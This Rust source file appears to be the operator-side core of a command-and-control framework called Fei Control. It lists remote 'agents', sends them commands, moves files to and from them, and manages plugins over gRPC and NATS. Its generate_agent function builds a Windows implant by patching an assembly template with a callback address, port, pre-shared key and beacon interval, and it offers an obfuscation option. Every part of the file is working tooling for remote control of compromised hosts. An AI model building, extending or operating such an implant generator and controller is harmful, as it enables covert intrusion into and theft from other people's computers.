pub mod credential_store;

pub mod fei_proto {
    tonic::include_proto!("fei.control");
    pub use fei_control_service_client::FeiControlServiceClient;
}

pub mod commands {
    use serde::{Deserialize, Serialize};
    use std::sync::Arc;
    use tokio::sync::Mutex;
    use tonic::transport::Channel;
    use crate::fei_proto::{
        FeiControlServiceClient, GetSystemInfoRequest, GetSystemMetricsRequest,
        GetTaskRequest, InstallPluginRequest, ListAgentsRequest, ListDirectoryRequest,
        ListPluginsRequest, SendCommandRequest, UninstallPluginRequest, UploadFileRequest,
        DownloadFileRequest,
    };

    #[derive(Clone)]
    pub struct AppState {
        pub nats_url: Arc<Mutex<String>>,
        pub client: Arc<Mutex<Option<async_nats::Client>>>,
        pub grpc_client: Arc<Mutex<Option<FeiControlServiceClient<Channel>>>>,
    }

    impl Default for AppState {
        fn default() -> Self {
            AppState {
                nats_url: Arc::new(Mutex::new("nats://127.0.0.1:4222".to_string())),
                client: Arc::new(Mutex::new(None)),
                grpc_client: Arc::new(Mutex::new(None)),
            }
        }
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct ConnectRequest {
        pub nats_url: String,
        pub grpc_addr: String,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct AgentInfo {
        pub id: String,
        pub hostname: String,
        pub ip_address: String,
        pub os_info: String,
        pub last_seen: String,
        pub state: u8,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct CommandRequest {
        pub agent_id: String,
        pub command: String,
        pub parameters: Vec<String>,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct CommandResponse {
        pub agent_id: String,
        pub command: String,
        pub result: String,
        pub success: bool,
        pub task_id: Option<String>,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct SystemMetrics {
        pub cpu_usage: f64,
        pub memory_usage: f64,
        pub disk_usage: f64,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct FileEntry {
        pub name: String,
        pub size: u64,
        pub is_directory: bool,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct DirectoryListing {
        pub path: String,
        pub files: Vec<FileEntry>,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct PluginInfo {
        pub id: String,
        pub name: String,
        pub version: String,
        pub status: String,
        pub description: String,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct PluginList {
        pub plugins: Vec<PluginInfo>,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct AgentConfig {
        pub gateway_addr: String,
        pub gateway_port: u16,
        pub psk_hex: String,
        pub heartbeat_interval_ms: u32,
        pub agent_name: String,
        pub output_dir: String,
        pub template_dir: String,
        pub enable_obfuscation: bool,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct TaskStatus {
        pub task_id: String,
        pub status: String,
        pub result: String,
    }

    #[derive(Serialize, Deserialize, Clone, Debug)]
    pub struct AgentGenerateResult {
        pub success: bool,
        pub agent_path: String,
        pub message: String,
    }

    pub async fn generate_agent_impl(
        _state: &AppState,
        config: AgentConfig,
    ) -> Result<AgentGenerateResult, String> {
        let template_path = std::path::Path::new(&config.template_dir).join("entry.asm");
        let asm_source = std::fs::read_to_string(&template_path)
            .map_err(|e| format!("Failed to read ASM template {}: {}", template_path.display(), e))?;

        let mut asm = asm_source;

        asm = asm.replace(
            "server_port         equ 443",
            &format!("server_port         equ {}", config.gateway_port),
        );

        if let Some(ip_dword) = parse_ip_to_dword(&config.gateway_addr) {
            asm = asm.replace(
                "mov dword [server_addr + 4], 0x0100007F",
                &format!("mov dword [server_addr + 4], 0x{:08X}", ip_dword),
            );
        } else {
            return Err(format!("Invalid gateway address: {}", config.gateway_addr));
        }

        asm = asm.replace(
            "heartbeat_interval_ms equ 30000",
            &format!("heartbeat_interval_ms equ {}", config.heartbeat_interval_ms),
        );

        if !config.psk_hex.is_empty() {
            let psk_bytes = hex_to_bytes(&config.psk_hex)?;
            if psk_bytes.len() == 32 {
                let mut psk_lines = String::from("psk_bytes:\n    db ");
                for (i, b) in psk_bytes.iter().enumerate() {
                    if i > 0 { psk_lines.push_str(", "); }
                    if i > 0 && i % 8 == 0 { psk_lines.push_str("\n    db "); }
                    psk_lines.push_str(&format!("0x{:02X}", b));
                }
                asm = asm.replace(
                    "psk_bytes:\n    times 32 db 0",
                    &psk_lines,
                );
            }
        }

        let work_dir = std::path::Path::new(&config.output_dir);
        std::fs::create_dir_all(work_dir)
            .map_err(|e| format!("Failed to create output dir: {}", e))?;

        let agent_id = format!("{}_{:08x}", config.agent_name, rand_suffix());
        let modified_asm = work_dir.join(format!("{}.asm", agent_id));
        std::fs::write(&modified_asm, &asm)
            .map_err(|e| format!("Failed to write modified ASM: {}", e))?;

        let obj_file = work_dir.join(format!("{}.obj", agent_id));
        let nasm_cmd = std::process::Command::new("nasm")
            .args(["-f", "win64", "-o"])
            .arg(&obj_file)
            .arg(&modified_asm)
            .output()
            .map_err(|e| format!("NASM not found or failed: {}", e))?;

        if !nasm_cmd.status.success() {
            return Err(format!("NASM failed: {}", String::from_utf8_lossy(&nasm_cmd.stderr)));
        }

        let agent_exe = work_dir.join(format!("{}.exe", agent_id));
        let link_cmd = std::process::Command::new("link")
            .args(["/NOLOGO", "/SUBSYSTEM:CONSOLE", "/ENTRY:_start", "/NODEFAULTLIB"])
            .arg(&obj_file)
            .arg(format!("/OUT:{}", agent_exe.display()))
            .args(["kernel32.lib", "ws2_32.lib"])
            .output()
            .map_err(|e| format!("Linker not found or failed: {}", e))?;

        if !link_cmd.status.success() {
            return Err(format!("Link failed: {}", String::from_utf8_lossy(&link_cmd.stderr)));
        }

        let _ = std::fs::remove_file(&modified_asm);
        let _ = std::fs::remove_file(&obj_file);

        Ok(AgentGenerateResult {
            success: true,
            agent_path: agent_exe.display().to_string(),
            message: format!("Agent '{}' generated successfully", agent_id),
        })
    }

    fn parse_ip_to_dword(ip: &str) -> Option<u32> {
        let parts: Vec<&str> = ip.split('.').collect();
        if parts.len() != 4 { return None; }
        let octets: Vec<u8> = parts.iter()
            .filter_map(|p| p.parse().ok())
            .collect();
        if octets.len() != 4 { return None; }
        Some(
            ((octets[3] as u32) << 24)
            | ((octets[2] as u32) << 16)
            | ((octets[1] as u32) << 8)
            | (octets[0] as u32)
        )
    }

    fn hex_to_bytes(hex: &str) -> Result<Vec<u8>, String> {
        if hex.len() % 2 != 0 {
            return Err("Hex string must have even length".to_string());
        }
        (0..hex.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&hex[i..i+2], 16).map_err(|e| e.to_string()))
            .collect()
    }

    fn rand_suffix() -> u32 {
        use std::time::{SystemTime, UNIX_EPOCH};
        let t = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        ((t >> 16) & 0xFFFFFFFF) as u32
    }

    async fn get_grpc_client(
        state: &AppState,
    ) -> Result<FeiControlServiceClient<Channel>, String> {
        let guard = state.grpc_client.lock().await;
        guard
            .clone()
            .ok_or_else(|| "Not connected to gRPC. Call connect_to_gateway first.".to_string())
    }

    async fn get_nats_client(state: &AppState) -> Result<async_nats::Client, String> {
        let guard = state.client.lock().await;
        guard
            .clone()
            .ok_or_else(|| "Not connected to NATS. Call connect_to_gateway first.".to_string())
    }

    pub async fn connect_impl(
        state: &AppState,
        nats_url: String,
        grpc_addr: String,
    ) -> Result<String, String> {
        let nats_url = if nats_url.is_empty() {
            state.nats_url.lock().await.clone()
        } else {
            nats_url
        };

        let nc = async_nats::connect(&nats_url)
            .await
            .map_err(|e| format!("NATS connect failed: {}", e))?;

        let _ = nc
            .publish("fei.system.status", "tauri_core connected".into())
            .await;

        let grpc_endpoint = if grpc_addr.is_empty() {
            "http://127.0.0.1:50051".to_string()
        } else {
            grpc_addr
        };

        let grpc_channel = tonic::transport::Channel::from_shared(grpc_endpoint.clone())
            .map_err(|e| format!("gRPC endpoint: {}", e))?
            .connect()
            .await
            .map_err(|e| format!("gRPC connect failed: {}", e))?;

        let grpc_client = FeiControlServiceClient::new(grpc_channel);

        {
            let mut url_guard = state.nats_url.lock().await;
            *url_guard = nats_url.clone();
        }
        {
            let mut client_guard = state.client.lock().await;
            *client_guard = Some(nc);
        }
        {
            let mut grpc_guard = state.grpc_client.lock().await;
            *grpc_guard = Some(grpc_client);
        }

        Ok(format!(
            "Connected to NATS at {}, gRPC at {}",
            nats_url, grpc_endpoint
        ))
    }

    #[tauri::command]
    pub async fn connect_to_gateway(
        state: tauri::State<'_, AppState>,
        nats_url: String,
        grpc_addr: String,
    ) -> Result<String, String> {
        connect_impl(&state, nats_url, grpc_addr).await
    }

    pub async fn list_agents_impl(state: &AppState) -> Result<Vec<AgentInfo>, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(ListAgentsRequest {});
        let response = client
            .list_agents(request)
            .await
            .map_err(|e| format!("gRPC list_agents: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        let agents: Vec<AgentInfo> = resp
            .agents
            .into_iter()
            .map(|a| AgentInfo {
                id: a.id,
                hostname: a.hostname,
                ip_address: a.ip_address,
                os_info: a.os_info,
                last_seen: a.last_seen,
                state: a.state as u8,
            })
            .collect();

        Ok(agents)
    }

    pub async fn send_command_impl(
        state: &AppState,
        req: CommandRequest,
    ) -> Result<CommandResponse, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(SendCommandRequest {
            agent_id: req.agent_id.clone(),
            command: req.command.clone(),
            parameters: req.parameters.clone(),
        });
        let response = client
            .send_command(request)
            .await
            .map_err(|e| format!("gRPC send_command: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        Ok(CommandResponse {
            agent_id: req.agent_id,
            command: req.command,
            result: resp.result,
            success: true,
            task_id: Some(resp.task_id),
        })
    }

    pub async fn get_system_info_impl(
        state: &AppState,
        agent_id: String,
    ) -> Result<AgentInfo, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(GetSystemInfoRequest {
            agent_id: agent_id.clone(),
        });
        let response = client
            .get_system_info(request)
            .await
            .map_err(|e| format!("gRPC get_system_info: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        let a = resp.agent.ok_or("agent not found")?;
        Ok(AgentInfo {
            id: a.id,
            hostname: a.hostname,
            ip_address: a.ip_address,
            os_info: a.os_info,
            last_seen: a.last_seen,
            state: a.state as u8,
        })
    }

    pub async fn get_system_metrics_impl(
        state: &AppState,
        agent_id: String,
    ) -> Result<SystemMetrics, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(GetSystemMetricsRequest {
            agent_id: agent_id.clone(),
        });
        let response = client
            .get_system_metrics(request)
            .await
            .map_err(|e| format!("gRPC get_system_metrics: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        Ok(SystemMetrics {
            cpu_usage: resp.cpu_usage,
            memory_usage: resp.memory_usage,
            disk_usage: resp.disk_usage,
        })
    }

    pub async fn list_directory_impl(
        state: &AppState,
        agent_id: String,
        path: String,
    ) -> Result<DirectoryListing, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(ListDirectoryRequest {
            agent_id: agent_id.clone(),
            path: path.clone(),
        });
        let response = client
            .list_directory(request)
            .await
            .map_err(|e| format!("gRPC list_directory: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        let files: Vec<FileEntry> = resp
            .files
            .into_iter()
            .map(|f| FileEntry {
                name: f.name,
                size: f.size,
                is_directory: f.is_directory,
            })
            .collect();

        Ok(DirectoryListing {
            path: resp.path,
            files,
        })
    }

    pub async fn upload_file_impl(
        state: &AppState,
        agent_id: String,
        local_path: String,
        remote_path: String,
    ) -> Result<String, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(UploadFileRequest {
            agent_id: agent_id.clone(),
            local_path: local_path.clone(),
            remote_path: remote_path.clone(),
        });
        let response = client
            .upload_file(request)
            .await
            .map_err(|e| format!("gRPC upload_file: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        Ok(resp.message)
    }

    pub async fn download_file_impl(
        state: &AppState,
        agent_id: String,
        remote_path: String,
        local_path: String,
    ) -> Result<String, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(DownloadFileRequest {
            agent_id: agent_id.clone(),
            remote_path: remote_path.clone(),
            local_path: local_path.clone(),
        });
        let response = client
            .download_file(request)
            .await
            .map_err(|e| format!("gRPC download_file: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        Ok(resp.message)
    }

    pub async fn list_plugins_impl(
        state: &AppState,
        agent_id: String,
    ) -> Result<PluginList, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(ListPluginsRequest {
            agent_id: agent_id.clone(),
        });
        let response = client
            .list_plugins(request)
            .await
            .map_err(|e| format!("gRPC list_plugins: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        let plugins: Vec<PluginInfo> = resp
            .plugins
            .into_iter()
            .map(|p| PluginInfo {
                id: p.id,
                name: p.name,
                version: p.version,
                status: p.status,
                description: p.description,
            })
            .collect();

        Ok(PluginList { plugins })
    }

    pub async fn install_plugin_impl(
        state: &AppState,
        agent_id: String,
        plugin_id: String,
    ) -> Result<String, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(InstallPluginRequest {
            agent_id: agent_id.clone(),
            plugin_id: plugin_id.clone(),
        });
        let response = client
            .install_plugin(request)
            .await
            .map_err(|e| format!("gRPC install_plugin: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        Ok(resp.message)
    }

    pub async fn uninstall_plugin_impl(
        state: &AppState,
        agent_id: String,
        plugin_id: String,
    ) -> Result<String, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(UninstallPluginRequest {
            agent_id: agent_id.clone(),
            plugin_id: plugin_id.clone(),
        });
        let response = client
            .uninstall_plugin(request)
            .await
            .map_err(|e| format!("gRPC uninstall_plugin: {}", e))?;

        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }

        Ok(resp.message)
    }

    #[tauri::command]
    pub async fn list_agents(state: tauri::State<'_, AppState>) -> Result<Vec<AgentInfo>, String> {
        list_agents_impl(&state).await
    }

    #[tauri::command]
    pub async fn send_command(
        state: tauri::State<'_, AppState>,
        req: CommandRequest,
    ) -> Result<CommandResponse, String> {
        send_command_impl(&state, req).await
    }

    #[tauri::command]
    pub async fn get_system_info(
        state: tauri::State<'_, AppState>,
        agent_id: String,
    ) -> Result<AgentInfo, String> {
        get_system_info_impl(&state, agent_id).await
    }

    #[tauri::command]
    pub async fn get_system_metrics(
        state: tauri::State<'_, AppState>,
        agent_id: String,
    ) -> Result<SystemMetrics, String> {
        get_system_metrics_impl(&state, agent_id).await
    }

    #[tauri::command]
    pub async fn list_directory(
        state: tauri::State<'_, AppState>,
        agent_id: String,
        path: String,
    ) -> Result<DirectoryListing, String> {
        list_directory_impl(&state, agent_id, path).await
    }

    #[tauri::command]
    pub async fn upload_file(
        state: tauri::State<'_, AppState>,
        agent_id: String,
        local_path: String,
        remote_path: String,
    ) -> Result<String, String> {
        upload_file_impl(&state, agent_id, local_path, remote_path).await
    }

    #[tauri::command]
    pub async fn download_file(
        state: tauri::State<'_, AppState>,
        agent_id: String,
        remote_path: String,
        local_path: String,
    ) -> Result<String, String> {
        download_file_impl(&state, agent_id, remote_path, local_path).await
    }

    #[tauri::command]
    pub async fn list_plugins(
        state: tauri::State<'_, AppState>,
        agent_id: String,
    ) -> Result<PluginList, String> {
        list_plugins_impl(&state, agent_id).await
    }

    #[tauri::command]
    pub async fn install_plugin(
        state: tauri::State<'_, AppState>,
        agent_id: String,
        plugin_id: String,
    ) -> Result<String, String> {
        install_plugin_impl(&state, agent_id, plugin_id).await
    }

    #[tauri::command]
    pub async fn uninstall_plugin(
        state: tauri::State<'_, AppState>,
        agent_id: String,
        plugin_id: String,
    ) -> Result<String, String> {
        uninstall_plugin_impl(&state, agent_id, plugin_id).await
    }

    pub async fn get_task_impl(
        state: &AppState,
        task_id: String,
    ) -> Result<TaskStatus, String> {
        let mut client = get_grpc_client(state).await?;
        let request = tonic::Request::new(GetTaskRequest { task_id: task_id.clone() });
        let response = client
            .get_task(request)
            .await
            .map_err(|e| format!("gRPC get_task: {}", e))?;
        let resp = response.into_inner();
        if !resp.success {
            return Err(resp.error);
        }
        Ok(TaskStatus {
            task_id: resp.task_id,
            status: resp.status,
            result: String::from_utf8_lossy(&resp.result).into_owned(),
        })
    }

    #[tauri::command]
    pub async fn get_task(
        state: tauri::State<'_, AppState>,
        task_id: String,
    ) -> Result<TaskStatus, String> {
        get_task_impl(&state, task_id).await
    }

    #[tauri::command]
    pub async fn generate_agent(
        state: tauri::State<'_, AppState>,
        config: AgentConfig,
    ) -> Result<AgentGenerateResult, String> {
        generate_agent_impl(&state, config).await
    }
}

pub use commands::{
    AppState, AgentInfo, CommandRequest, CommandResponse, SystemMetrics, TaskStatus,
    DirectoryListing, PluginList, AgentConfig, AgentGenerateResult,
    connect_to_gateway, list_agents, send_command,
    get_system_info, get_system_metrics,
    list_directory, upload_file, download_file,
    list_plugins, install_plugin, uninstall_plugin,
    generate_agent, get_task,
};

pub fn init() {
    println!("Fei Control Core initialized");
}
